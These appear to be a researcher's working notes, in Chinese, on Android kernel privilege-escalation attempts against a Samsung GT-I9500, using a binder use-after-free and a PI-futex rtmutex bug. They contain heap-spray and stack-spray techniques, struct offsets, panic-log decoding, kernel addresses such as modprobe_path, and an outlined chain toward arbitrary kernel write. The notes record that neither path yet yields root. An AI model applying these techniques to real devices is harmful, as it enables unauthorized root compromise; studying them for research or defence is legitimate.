> 目标：GT-I9500 / Exynos 5410 / Android 5.0.1 / kernel 3.4.5-6264821
> 目的：找一条**不依赖内核栈地址**的提权入口（替代卡在 `plist_del` 的 CVE-2026-43499 路线）

## 二、漏洞机理（源码级）

`drivers/staging/android/binder.c`：

```c
static unsigned int binder_poll(struct file *filp, struct poll_table_struct *wait)
{
	thread = binder_get_thread(proc);

	wait_for_proc_work = thread->transaction_stack == NULL &&
		list_empty(&thread->todo) && thread->return_error == BR_OK;

	if (wait_for_proc_work) {
		if (binder_has_proc_work(proc, thread)) return POLLIN;
		poll_wait(filp, &proc->wait, wait);      /* 安全：proc 不会被单独释放 */
		...
	} else {
		if (binder_has_thread_work(thread)) return POLLIN;
		poll_wait(filp, &thread->wait, wait);    /* ← UAF：thread 会被 kfree */
		...
	}
}
```

`binder_free_thread()`（`BINDER_THREAD_EXIT` 触发，L2905）结尾只有 `kfree(thread)`，
**从不调用 `remove_wait_queue()`** → epoll 的 `eppoll_entry.whead` 指向已释放的 `thread->wait`。

后续 `EPOLL_CTL_DEL` → `ep_remove` → `ep_unregister_pollwait` → `remove_wait_queue(freed, ...)`
→ `list_del(&pwq->wait.task_list)` → 两次受控写。

## 三、进入脆弱分支的三个条件（关键约束）

```c
wait_for_proc_work = transaction_stack == NULL && list_empty(todo) && return_error == BR_OK;
binder_has_thread_work() = !list_empty(todo) || return_error != BR_OK || NEED_RETURN;
```

- 要进 `else`（thread->wait）分支：三者不能全真
- 但 `binder_has_thread_work()` **不包含 transaction_stack**，所以 `todo` 必须为空、
  `return_error` 必须为 `BR_OK`、不能置 `NEED_RETURN`
- **唯一可行状态：`transaction_stack != NULL` + `todo` 空** —— 即「有一条已发出、尚未被回复的同步事务」

## 四、真机命中证据（决定性）

`/proc/last_kmsg`（`lk_b2.txt`）：

```
kernel BUG at lib/list_debug.c:72!
PC is at __list_del_entry+0x80/0xf0
Backtrace:
 [<c025cd68>] __list_del_entry+0x0/0xf0  from [<c025ce6c>] list_del+0x14/0x2c
 [<c025ce58>] list_del+0x0/0x2c          from [<c0054bf4>] remove_wait_queue+0x24/0x34
 [<c0054bd0>] remove_wait_queue+0x0/0x34 from [<c013a270>] ep_unregister_pollwait.isra.5+0x48/0x68
 [<c013a228>] ep_unregister_pollwait     from [<c013a2b4>] ep_remove+0x24/0xd8
 [<c013a290>] ep_remove+0x0/0xd8         from [<c013af90>] sys_epoll_ctl+0x250/0x854
```

字段解析：`entry = 0xe3f94dd8`（eppoll_entry 的 `wait.task_list`），
`entry->prev = entry->next = 0xd8540734`，而该处已被 `init_waitqueue_head()` 重置为自指空链表
→ 说明释放后的 chunk 被**新的 binder_thread** 复用了。UAF 成立。

另一条旁证（dmesg）：

```
binder: release 8196:8196 transaction 106695 out, still active
binder: send failed reply for transaction 106695, target dead
```

「still active」= 我们进程退出时那条事务仍处于 pending 状态，即窗口确实进过。

## 五、为什么难：窗口只有几十微秒

| 事实 | 数据 |
|---|---|
| servicemanager 线程数 | **1**（串行处理） |
| 无队列时回包延迟 | ~16–24 µs |
| 我们的关键路径 | `send_txn` → `read`(drain) → `epoll_ctl(ADD)`，约 20–30 µs |
| 竞争点 | 回包由 `binder_transaction(reply)` 里 `binder_pop_transaction(us)` 完成，**发生在服务端发送时**，不是我们读的时候 |

也就是说：只要 servicemanager 在我们 `epoll_ctl(ADD)` 之前处理完，`transaction_stack` 就被弹空，
`binder_poll` 走 `POLLIN` 早退、**根本不注册** → 后续 DEL 无害。

### 试过但失败的加速/延迟手段

| 手段 | 结果 |
|---|---|
| 合并 write+read 到一个 ioctl | ❌ `binder_thread_read` 等待前会 `binder_unlock()`，服务端趁机回包 |
| N 线程各发 1 条堆队列 | ⚠️ 每 binder_thread 只能挂 1 条；N=60 偶发 524µs，N=100/150 又回到 52 字节（不稳定） |
| 大量 ioctl 灌注 | ❌ 致命：3.4 是**全局 binder_lock**，几千条会把锁打爆 → RCU stall / 看门狗重启；还观察到 `binder_poll` 永久 D 状态 |
| 让回复失败以阻止 pop | ❌ `binder_send_failed_reply()` 里同样 `binder_pop_transaction()` |
| 夺取 context manager | ❌ servicemanager 已占用，`BINDER_SET_CONTEXT_MGR` 返回 `-EBUSY` |
| 目标改为自己进程的节点（永不回复） | ❌ 需要本进程内的 handle，而 handle 只能由「收到含 binder 对象的事务」产生，先有鸡还是先有蛋 |

# 附：后续突破（第二轮）

## 9. 关键修复：wait_queue_head_t 的 lock 是 8 字节

`CONFIG_GENERIC_LOCKBREAK=y` → `raw_spinlock_t = arch_spinlock_t(4) + break_lock(4)`，
所以 `wait_queue_head_t`（binder_thread 偏移 0x2c）实际布局：

| 偏移 | 字段 | 对应 iovec 槽位（8B/项） |
|---|---|---|
| chunk+0x2c | `lock.raw_lock` | `iov[5].iov_len` |
| chunk+0x30 | `lock.break_lock` | `iov[6].iov_base` |
| chunk+0x34 | `task_list.next` | `iov[6].iov_len` |
| chunk+0x38 | `task_list.prev` | `iov[7].iov_base` |

**踩过的坑**：一开始把 `iov[5].iov_len` 填成 `0x40`，ARM ticket spinlock 得到
`owner=0x40,next=0`，自增后 `next=1` 永远等不到 `owner` → `remove_wait_queue` 在
**关中断**状态下死转 → 整核挂死 → 看门狗复位（`Restarting system` / `No errors detected`）。
把该槽位置 0 后，才变成正常的 BUG panic。

## 10. 完整链路已经在真机跑通

`bu 80`（80 条队列）的一次成功运行：

```
[p1]sent
[p2]rc8            ← 抢到 pending 窗口
[p3]added          ← epoll 注册在 &thread->wait
[p4]exit...
[p5]exited         ← binder_thread 已 kfree
[X0] go, THREAD_EXIT=0
[X1] sprayed=13 -> DEL
```

随后必然发生下列之一：

| 结果 | 含义 |
|---|---|
| `kernel BUG at lib/list_debug.c:72` + `remove_wait_queue` 栈 | chunk 被**新的 binder_thread** 重用（`init_waitqueue_head` 把链表重置成空） |
| `[X2] DEL r=0` | chunk 没被任何人重用，链表仍一致 → `list_del` 静默成功 |

两次已捕获的 panic（`lk_b2.txt` / `lk_b6.txt`）都是前者：字段解出来
`entry->prev = entry->next = &task_list`（自指空链表），`&task_list - 8 = thread->wait`。

## 11. 当前唯一剩余障碍：kmalloc-256 的占位命中率

- 释放（`kfree(thread)`）在 CPU0，我们的 `writev` 也在 CPU0，但 SLUB 的
  `kfree` 若发现对象不属于 **当前 cpu slab**，会挂回**原 page 的 freelist**；
  紧接着的 `kmalloc` 仍从当前 cpu slab 取 → 拿不到那块。
- 实测 13 个并发 `writev(32 iovec)`（=13 个 256B 对象）仍然没命中。
- 系统本身还在不停新建 binder_thread（每个进程的第一次 binder 调用都会建），
  所以「对手」不只我们。

### 下一步可做（heap grooming）

1. **把目标页变成 cpu slab**：在 `THREAD_EXIT` 之前大量申请 256B 对象（大量 binder ioctl / 大量阻塞 writev），把 cpu slab 耗尽，逼 SLUB 从 partial 链表拉新页。
2. **批量释放**：N 个线程同时 `BINDER_THREAD_EXIT`，一次性放出 N 个 chunk，再用 N 个 iovec 喷，命中率按 N 线性上升。
3. **改用 `sendmsg` 的 `sockaddr_storage`（128B）或 `msg_msg`** 等其它可控大小的堆喷，匹配实际 cache。
4. 命中之后：`waiter->lock` 已经是我们的数据 → `plist_del/list_del` 的两次写就是**受控写** → 直接打 `modprobe_path`（`0xc0b9ec3c`）或 `commit_creds(prepare_kernel_cred(0))`。

# 附：第三轮 —— 达成「完全受控的 chunk 重占位」，但证明此路不通

## 13. 关键突破：thread refresh 让 iovec 真正占住 chunk

`binder_free_thread` 的 `kfree` 若发现对象不属于当前 cpu slab，只挂回原 page 的
freelist，紧随的 `kmalloc` 取不到。对策（已实现并验证）：

```c
ioctl(fd, BINDER_THREAD_EXIT, NULL);   /* 释放旧 thread */
ioctl(fd, BINDER_VERSION, &v);         /* 重新 kzalloc 一个：必然来自当前 cpu slab */
/* 之后 send → read → epoll_ctl(ADD) → THREAD_EXIT → writev，LIFO 命中 */
```

## 14. 铁证：chunk 里就是我们的 iovec（lk_b7.txt）

panic 现场 `r5 = 0xcf84e32c` = `&thread->wait`，推出 `chunk = 0xcf84e300`，
内存 dump 逐个字对上：

| chunk 偏移 | 实测值 | 我们的 iovec 字段 |
|---|---|---|
| +0x00 | `0xb6bb8800` | `iov[0].iov_base`（dat+0x800） |
| +0x04 | `0x00000040` | `iov[0].iov_len` |
| …… | …… | …… |
| +0x2c | `0x00000001` | `iov[5].iov_len`（初值 0，被 `spin_lock` 写成 1） |
| +0x34 | `0x00010000` | `iov[6].iov_len` → **task_list.next** |
| +0x38 | `0xb6bb8800` | `iov[7].iov_base` → **task_list.prev** |

**受控重占位成立。**

## 15. 但这条路径无法提权（关键结论）

同一次 dump 里，eppoll_entry 的 `wait.task_list`：

```
entry = 0xc3a51978
entry->next = 0xcf84e334
entry->prev = 0xcf84e334      ← 两者都等于 chunk + 0x34，即 &q->task_list
```

`remove_wait_queue()` 最终是 `list_del(&wait->task_list)`，
而 `__list_del(prev, next)` 展开就是：

```c
next->prev = prev;   // *(chunk+0x38) = chunk+0x34
prev->next = next;   // *(chunk+0x34) = chunk+0x34
```

`prev` / `next` 都等于 `&q->task_list`（在**我们自己的 chunk 内部**），
所以两次写都是**自写**——写不回任何内核关键结构。

而 `__list_del_entry_valid()` 会先比较 `prev->next == entry`，
`entry` 是 epoll `pwq` 的地址（`pwq_cache` 分配，无法预测、无泄漏面），
我们不可能让它通过 → `CONFIG_SEC_DEBUG_LIST_PANIC` 直接 `BUG()` → panic。

### 另外两条消费路径也都不成立

| 潜在消费者 | 结果 |
|---|---|
| `binder_transaction` 引用 `t->to_thread` / `t->from` | `binder_free_thread` 已把两者全部置 NULL（源码 L2739-2747），无悬空 |
| `wake_up_interruptible(&thread->wait)` 调用 `entry->func` | 线程已从 `proc->threads` rb 树摘除，驱动再无唤醒源 |

### 补充：为什么不能用「把 task_list 指向内核地址」绕过

`rw_copy_check_uvector` 对每个 iovec 都做 `access_ok(base, len)`，
要求 `base + len <= TASK_SIZE (0xC0000000)`。所以 iovec 里的值
**只能是用户地址**，无法直接放内核地址（如 `modprobe_path = 0xc0b9ec3c`）。

## 16. 结论

**CVE-2019-2215 在这台机器上（3.4.5 + CONFIG_DEBUG_LIST + SEC_DEBUG_LIST_PANIC）
的 epoll 路径只能做到 DoS/panic，无法转化为任意写。**

已达成的东西仍然有复用价值：
- 一套可复现的 binder UAF 触发链（含窗口抢取、队列延迟标定）；
- 一个可靠的 **kmalloc-256 受控重占位** 手法（thread refresh + 阻塞 writev）；
- 完整的 panic 现场解码工具链。

但它不足以拿到 root。要继续，只能换入口。

# 附：切回 CVE-2026-43499 —— 不需要 infoleak 的新思路

## 17. 之前卡住的真正原因（重新审视）

`adjust_prio_chain` 里那一行：

```c
plist_del(&waiter->list_entry, &lock->wait_list);   /* rtmutex.c:243 */
```

`plist_del` 内部对 `node->node_list`（waiter+0x0c）做 `list_del_init`，
`CONFIG_DEBUG_LIST` 会校验 `prev->next == entry`，而 `entry = waiter+0x0c`
是内核栈地址 —— 这就是之前认为「必须有 infoleak」的原因。

**但漏看了一点**：这个 waiter 在变成悬空指针之前，已经先被
`remove_waiter()` 里的 `plist_del(&waiter->list_entry, ...)` 处理过了：

```c
static void remove_waiter(struct rt_mutex *lock, struct rt_mutex_waiter *waiter)
{
	...
	plist_del(&waiter->list_entry, &lock->wait_list);   /* ← list_del_init */
	current->pi_blocked_on = NULL;                      /* ← bug：该清 waiter->task 的 */
```

`list_del_init` 会把 `node_list.next/prev` **重新设成指向自己**。
所以悬空之后，waiter 的 `list_entry`（+0x00 ~ +0x13）本身是**自洽的自指链表**。

=> 只要喷雾**不碰 +0x00..+0x13**，第二次 `plist_del` 的校验
`prev == next == entry` 天然成立，**根本不需要知道栈地址**。

## 18. 因此真正需要的喷雾形态

只需覆盖（从 +0x14 开始）：

| waiter 偏移 | 字段 | 需要的值 |
|---|---|---|
| +0x14 | `pi_list_entry`（plist_node, 0x14B） | 可随意（后续才用） |
| +0x28 | `task` | 伪造 task 指针（或 NULL） |
| +0x2c | `lock` | **指向我们 mmap 的假 rt_mutex** |

对应栈深度：waiter = entry_sp - 0x1B0，所以需要写入区间 **[0x1C4, 0x1E0)**，
且**不能落在 0x1B0..0x1C3**。

已有的喷雾源都不满足：

| 喷雾源 | 覆盖范围（相对 waiter） | 结论 |
|---|---|---|
| recvmmsg iovstack（≤8 段，栈上 64B） | +0x10 … +0x4f | 打到 +0x10，破坏 node_list.prev ✗ |
| sendmmsg iovstack | +0x30 … | 盖不到 +0x28/+0x2c ✗ |
| pselect6 `stack_fds` | +0x20 … | 范围对，但 `core_sys_select` 的 fd_set_bits 6 指针压在 +0x08..+0x1f ✗ |
| readv/writev iovstack | +0x?? 0xC0 深度 | 太浅 ✗ |

=> 需要一个**起始深度恰好在 0x1C4~0x1D8 之间**的栈写入原语。
这是接下来唯一要解决的事，比找 infoleak 现实得多。

## 19. 越过 plist_del 之后能拿到什么

```c
top_waiter = rt_mutex_top_waiter(lock);        /* 从我们的假锁取 → 我们页内的假节点 */
plist_del(&waiter->list_entry, &lock->wait_list);
waiter->list_entry.prio = task->prio;
plist_add(&waiter->list_entry, &lock->wait_list);
...
if (waiter == rt_mutex_top_waiter(lock)) {
	plist_del(&top_waiter->pi_list_entry, &task->pi_waiters);   /* ← 关键 */
	...
}
```

`top_waiter` 来自我们假锁的 `wait_list`，其 `node_list.next` 由我们控制：

```c
next = list_entry(node->node_list.next, struct plist_node, node_list);
if (list_empty(&next->prio_list))
	list_add(&next->prio_list, &node->prio_list);
```

`node->node_list.next` 是我们写进去的**任意内核地址** →
`list_add` 会对 `next->prio_list` 做两次写（`next->prev = ...` / `prev->next = ...`）
→ **这就是任意写**。可以直接打 `modprobe_path`（0xc0b9ec3c）或改 cred。

## 20. 本轮负面结论（排除项）

- `panic_on_oops=1`，oops 路线不可用。
- `/proc/self/stack` 存在且可读，但地址被 `%pK` 清零（符号名保留）。
- `/proc/self/stat` 的 kstkesp 是**用户态** SP，无用。
- 实测 8 种 PI-futex 边界用法（伪造 TID / OWNER_DIED / WAIT_REQUEUE_PI 各种畸形 /
  TRYLOCK_PI / 自锁）**均未触发任何 WARN**，futex 路径没有现成的 dump_stack 可用。
- dmesg 里确实存在内核栈地址（`0xe4xxxxxx`，来自 lp5562 除零 WARN 的寄存器 dump），
  但 `/sys/class/sec/led/led_blink` 是 `system:system 0664`，shell 写不了；
  `/sys/class`、`/sys/devices/platform` 下无 other-writable 项。

## 21. 找到喷雾原语：`shmctl` 的部分栈拷贝（本轮决定性发现）

### 更正一个之前的错误结论

SysV IPC **没有被裁掉**。kallsyms 里是真实函数，不是 `ni_syscall`：

```
sys_ni_syscall  = 0xc0055ba4
sys_shmctl      = 0xc01f5ab0     ← 真函数
sys_msgctl      = 0xc01f22c4
sys_semctl      = 0xc01f4434
sys_semtimedop  = 0xc01f450c
```

ARM 系统调用号（arch/arm/kernel/calls.S）：
`sys_shmat=305, shmdt=306, shmget=307, **shmctl=308**, semtimedop=309`

### 深度刚好对上

`sys_shmctl` 的 IPC_SET 分支会在自己栈上放一个 `struct shmid64_ds`（0x44 字节）
并 `copy_from_user`，扫描器给出的起始深度是 **D = 0x174**。

```
waiter          = entry_sp - 0x1B0
node_list.next  = waiter+0x0c  → 深度 0x1A4   ← 必须保持原样（自指）
node_list.prev  = waiter+0x10  → 深度 0x1A0   ← 必须保持原样
task            = waiter+0x28  → 深度 0x188   ← 想写
lock            = waiter+0x2c  → 深度 0x184   ← 想写

shmctl 缓冲起点 = 深度 0x174 = waiter+0x3C
```

只要**拷贝长度截断在 0x18~0x30 之间**：

| 拷贝长度 | 覆盖范围 | 覆盖 task/lock | 不碰 node_list |
|---|---|---|---|
| 0x18 | waiter+0x3C..+0x25 | ✓ | ✓ |
| **0x20** | waiter+0x3C..+0x1D | ✓ | ✓ |
| 0x2c | waiter+0x3C..+0x11 | ✓ | ✓ |
| 0x44（整结构） | waiter+0x3C..-0x07 | ✓ | ✗ |

字段映射（`struct shmid64_ds` 内偏移）：

```
buf[0x10..0x13] → waiter+0x2c = lock   （指向我们 mmap 的假 rt_mutex）
buf[0x14..0x17] → waiter+0x28 = task
```

### 怎么把拷贝长度卡在 0x20

`copy_from_user(&shmid64, buf, sizeof(shmid64))` 是固定长度，但
`copy_from_user` **在页错误处会截断**：把 `buf` 放在某一页的末尾
（`buf = page + 0x1000 - 0x20`），下一页不映射，则只拷 0x20 字节，
随后返回非 0 → `sys_shmctl` 返回 `-EFAULT`，**但栈上那 0x20 字节已经被写入**。

（待实测确认：ARM 的 `__copy_from_user` 是分块 `ldm/stm`，需验证
截断粒度是否为 32 字节；若不是，按实际粒度调整 `buf` 的对齐方式。）

## 22. 完整攻击链（现在没有缺口了）

```
1) thread A: FUTEX_LOCK_PI(u3) + WAIT_REQUEUE_PI(u1→u2) + thread B 占 u2 阻塞在 u3
   thread C: CMP_REQUEUE_PI(u1→u2) → -EDEADLK
   ⇒ remove_waiter(current=C) 清错人，A->pi_blocked_on 悬空
   ⇒ waiter->list_entry 已被 list_del_init 成**自指**（关键）
2) thread A: shmctl(IPC_SET, buf) 部分拷贝 0x20 字节
   ⇒ 写入 waiter->lock = 假 rt_mutex，waiter->task = 任意值
   ⇒ node_list 未被触碰，保持自指
3) thread T: 阻塞在 A 持有的 PI mutex
   ⇒ adjust_prio_chain → lock = 假锁 → trylock 成功
   ⇒ rt_mutex_top_waiter(假锁) 返回我们页内的假节点（BUG_ON 可满足）
   ⇒ plist_del(&waiter->list_entry, ...) **校验通过**（自指）
   ⇒ plist_add(&waiter->list_entry, &假锁->wait_list)
   ⇒ plist_del(&top_waiter->pi_list_entry, &task->pi_waiters)
        next = list_entry(假节点->node_list.next) ← 我们写的任意内核地址
        list_add(&next->prio_list, ...) → 两次写 → **任意写**
4) 打 modprobe_path (0xc0b9ec3c) → request_module → kernel 域 uid0 执行脚本
```

**结论：不需要 infoleak，缺口已经补上。**

# 附：实测 —— msgctl 喷栈命中，但被 __copy_from_user 自身栈帧破坏

## 23. 先修正两处静态分析错误

用新的精确深度计算器 `src/depthcalc.py`（逐字反汇编 + 帧累加 + `(目标深度 D, 调用点 sp 深度)` 二元组）
重算了 shmctl，之前的结论是错的：

| 项 | 之前（错） | 实际（反汇编权威） |
|---|---|---|
| shmctl IPC_SET 拷贝深度 | 0x174 | IPC_64 **0x144**、IPC_OLD **0x174** |
| 缓冲区写入方向 | 以为从 waiter+0x3C 向下覆盖 lock | **向上写**：只覆盖 waiter+0x3C..+0x8F，根本到不了 lock |
| 缓冲区起始 | waiter+0x3C | 同上——**shmctl 完全不可用** |

## 24. 真正可用的入口：msgctl IPC_OLD

全量扫描所有 `sys_*`（含多层调用链）后，落在窗口内的只有一个：

```
sys_msgctl -> msgctl_down (entry 0xD0, frame 0xC8)
  copy_from_user(tbuf_old @ fp-0xbc, buf, 0x38)   sp = 0x198
  => D = 0x190 = waiter + 0x20
  => buf[0x08] -> waiter->task(+0x28)
     buf[0x0C] -> waiter->lock(+0x2C)
  => 完全不碰 waiter+0x00..+0x13（list_entry）
```

`msgctl(0, IPC_SET, buf)`（cmd=1，不带 IPC_64 位 → IPC_OLD 分支）即可；
`msqid` 非法也没关系——`msgctl_down` 先做 copy 再校验 id。

**真机实测（probe 模式）已确认命中**：把假锁的空链表校验字设成 `0xdeadbeef`，
核对 `rtmutex_common.h:74` 的 `BUG_ON(w->lock != lock)` 时：

```
kernel BUG at kernel/rtmutex_common.h:74
PC  rt_mutex_adjust_prio_chain+0x428
r8 = 0xb6fe1000  ← 我们 mmap 的 fake_lock
r2 = 0xb6fe1008  ← plist_first_entry 得到的 node_list 指针
```

即 **`waiter->lock` 确实被写成了我们的假锁**，深度 0x190 与字段映射 `buf[0x0C]` 双双实证。

顺带修掉一个前置障碍：`adjust_prio_chain` 第 66 行
```c
if (top_waiter && (!task_has_pi_waiters(task) || top_waiter != task_top_pi_waiter(task)))
        goto out_unlock_pi;
```
A 的 `pi_waiters` 里同时有 B（阻塞在 A 的 u3 上）和 T 的 waiter，同优先级时 T 被追加在尾部 →
队首是 B → 链走直接退出。给 B 加 `nice(19)` 让 T 排到队首，链走才真正进入。

## 25. 致命问题：__copy_from_user 自己的栈帧把 list_entry 打烂

把假锁做成完全合法（`wait_lock=0`、`owner=0`、空链表校验字自指）后，崩点前移到：

```
kernel BUG at lib/list_debug.c:72
__list_del_entry+0x80
  <- plist_del+0x44          ← 删的是 waiter+0x04（list_entry.prio_list）
    <- rt_mutex_adjust_prio_chain+0x1ac   ← 源码第 95 行
```

原因在 `__copy_from_user` 的序言：

```
c0248800  push {r0, r2, r3, r4, lr}     ; 5 个 = 0x14
c0248824  push {r5, r6, r7, r8}         ; 4 个 = 0x10
```

调用点 sp = 0x198，压栈区 = 深度 **0x19C..0x1BC**，而：

| 压栈槽深度 | waiter 偏移 | 字段 |
|---|---|---|
| 0x19C | +0x14 | pi_list_entry.prio |
| 0x1A0 | +0x10 | node_list.prev |
| 0x1A4 | +0x0C | node_list.next |
| 0x1A8 | +0x08 | prio_list.prev |
| 0x1AC | +0x04 | prio_list.next |
| 0x1B0 | +0x00 | prio |

**`push` 只保存寄存器、不会还原内存**——压进去的值就永久留在 waiter 上了。
于是 `list_entry` 被写成一堆寄存器值，`plist_del` 的 DEBUG_LIST 校验必然失败。

## 26. 几何条件（决定这类方案是否可行的判据）

设拷贝目标深度 D，调用点 sp 深度 S，`__copy_from_user` 帧 0x24：

- 必须写到 `lock`（深度 0x184）→ `D >= 0x184`
- 不能碰到 `list_entry`（0x19C..0x1AC）→ 压栈区 `[S+4, S+0x24]` 必须整体更深：**`S >= 0x1A9`**

两者合起来：**`D ∈ [0x184, 0x1AB]` 且 `S >= 0x1A9`**。

全量扫描结果（D 在 0x180~0x1B0 的所有 syscall 栈拷贝点）：

| syscall | D | S | 判定 |
|---|---|---|---|
| `sys_msgctl` | 0x190 | **0x198** | 可达 lock，但 S 浅 **0x11** → 压栈区砸烂 list_entry |
| `sys_semtimedop` | 0x1B0 | 0x210 | S 够深，但 D 过深，整块 waiter 被覆盖 |

**没有任何一个 syscall 同时满足两个条件。**

## 27. 结论：上一节的「不需要 infoleak」判断作废

`remove_waiter()` 留下的自指链表本身是对的，但**喷雾这一步自己会把它打烂**：
只要目标深度能到 `lock`，`__copy_from_user` 的寄存器压栈就必然落在 `waiter+0x00..+0x14`。

所以 CVE-2026-43499 在这台机器上仍然需要一个**内核栈地址泄漏**：
拿到 `waiter` 绝对地址后，才能把 `list_entry` 的三个自指字（+0x04/+0x0C/+0x10）重新写成合法值。
